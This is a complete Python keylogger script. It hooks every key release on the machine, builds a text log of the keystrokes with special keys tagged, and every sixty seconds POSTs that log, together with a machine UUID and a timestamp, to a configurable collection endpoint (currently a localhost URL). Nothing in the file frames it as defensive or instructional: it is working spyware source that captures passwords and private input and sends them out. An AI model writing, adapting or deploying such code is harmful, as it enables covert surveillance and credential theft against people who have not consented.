#Imports
import keyboard
import requests
import uuid
import json
from threading import Timer
from datetime import datetime
from subprocess import Popen,PIPE
import os, signal
from sys import stdout
from re import split

SEND_TIMER = 60
URL = 'http://127.0.0.1:6500/submit'

#Keylogger class
class Keylogger:
    def __init__(self, interval, url):
        self.interval = interval
        self.report_method = "post"
        self.log = ""
        self.uuid = uuid.uuid1()
        self.url = url

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # append key
        self.log += name
 
    def send_request(self):
        reqdata = {"uuid": str(self.uuid), "log_time": str(datetime.now()), "logs": str(self.log)}
        r = requests.post(url=self.url, json=reqdata)
        print("log recorded")

    def report(self):
        if self.log:
            if self.report_method == "post":
                try:
                    self.send_request()
                except:
                    print("server endpoint error")
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        self.report()
        print(f"{datetime.now()} - Started keylogger")
        keyboard.wait()

if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_TIMER, url=URL)
    keylogger.start()